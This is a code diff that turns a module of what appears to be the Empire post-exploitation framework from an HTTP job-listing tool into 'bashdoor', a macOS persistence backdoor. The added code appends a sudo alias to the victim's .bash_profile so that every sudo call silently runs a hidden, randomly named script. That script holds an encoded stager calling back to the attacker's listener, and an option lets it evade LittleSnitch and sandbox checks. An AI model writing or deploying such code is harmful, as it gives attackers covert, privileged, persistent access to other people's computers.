@@ -1,5 +1,3 @@
-from lib.common import helpers
-
 class Module:
 
     def __init__(self, mainMenu, params=[]):
@@ -7,25 +5,25 @@ class Module:
         # metadata info about the module, not modified during runtime
         self.info = {
             # name for the module that will appear in module menus
-            'Name': 'Chronos API List Jobs',
+            'Name': 'bashdoor',
 
             # list of one or more authors for the module
-            'Author': ['@TweekFawkes'],
+            'Author': ['@n00py'],
 
             # more verbose multi-line description of the module
-            'Description': ('List Chronos jobs using the HTTP API service for the Chronos Framework'),
+            'Description': 'Creates an alias in the .bash_profile to cause the sudo command to execute a stager and pass through the origional command back to sudo',
 
             # True if the module needs to run in the background
             'Background' : False,
 
             # File extension to save the file as
-            'OutputExtension': "json",
+            'OutputExtension' : "",
 
             # if the module needs administrative privileges
             'NeedsAdmin' : False,
 
             # True if the method doesn't touch disk/is reasonably opsec safe
-            'OpsecSafe' : True,
+            'OpsecSafe' : False,
 
             # the module language
             'Language' : 'python',
@@ -34,7 +32,7 @@ class Module:
             'MinLanguageVersion' : '2.6',
 
             # list of any references/other comments
-            'Comments': ["Docs: https://mesosphere.github.io/mesos-dns/docs/http.html", "Source Code: https://github.com/mesosphere/mesos-dns/blob/master/resolver/resolver.go"]
+            'Comments': []
         }
 
         # any options needed by the module, settable during runtime
@@ -42,22 +40,24 @@ class Module:
             # format:
             #   value_name : {description, required, default_value}
             'Agent' : {
-                # The 'Agent' option is the only one that MUST be in a module
                 'Description'   :   'Agent to execute module on.',
                 'Required'      :   True,
                 'Value'         :   ''
             },
-            'Target' : {
-                # The 'Agent' option is the only one that MUST be in a module
-                'Description'   :   'FQDN, domain name, or hostname to lookup on the remote target.',
-                'Required'      :   True,
-                'Value'         :   'chronos.mesos'
+            'SafeChecks': {
+                'Description': 'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
+                'Required': True,
+                'Value': 'True'
             },
-            'Port' : {
-                # The 'Agent' option is the only one that MUST be in a module
-                'Description'   :   'The port to connect to.',
+            'Listener' : {
+                'Description'   :   'Listener to use.',
                 'Required'      :   True,
-                'Value'         :   '8080'
+                'Value'         :   ''
+            },
+            'UserAgent' : {
+                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
+                'Required'      :   False,
+                'Value'         :   'default'
             }
         }
 
@@ -71,35 +71,37 @@ class Module:
         #   in case options are passed on the command line
         if params:
             for param in params:
+                # parameter format is [Name, Value]
                 option, value = param
                 if option in self.options:
                     self.options[option]['Value'] = value
 
-
     def generate(self):
-        target = self.options['Target']['Value']
-        port = self.options['Port']['Value']
-        
 
-        script = """
-import urllib2
-
-target = "%s"
-port = "%s"
-
-url = "http://" + target + ":" + port + "/scheduler/jobs"
-
-try:
-    request = urllib2.Request(url)
-    request.add_header('User-Agent',
-                   'Mozilla/6.0 (X11; Linux x86_64; rv:24.0) '
-                   'Gecko/20140205     Firefox/27.0 Iceweasel/25.3.0')
-    opener = urllib2.build_opener(urllib2.HTTPHandler)
-    content = opener.open(request).read()
-    print str(content)
-except Exception as e:
-    print "Failure sending payload: " + str(e)
-
-""" %(target, port)
-
+        # extract all of our options
+        listenerName = self.options['Listener']['Value']
+        userAgent = self.options['UserAgent']['Value']
+        safeChecks = self.options['SafeChecks']['Value']
+        # generate the launcher code
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', encode=True, userAgent=userAgent, safeChecks=safeChecks)
+        launcher = launcher.replace('"', '\\"')
+        script = '''
+import os
+from random import choice
+from string import ascii_uppercase
+home =  os.getenv("HOME")
+randomStr = ''.join(choice(ascii_uppercase) for i in range(12))
+bashlocation = home + "/Library/." + randomStr + ".sh"
+with open(home + "/.bash_profile", "a") as profile:
+    profile.write("alias sudo='sudo sh -c '\\\\''" + bashlocation + " & exec \\"$@\\"'\\\\'' sh'")
+launcher = "%s"
+stager = "#!/bin/bash\\n"
+stager += launcher
+with open(bashlocation, 'w') as f:
+    f.write(stager)
+    f.close()
+os.chmod(bashlocation, 0755)
+''' % (launcher)
         return script
+
+
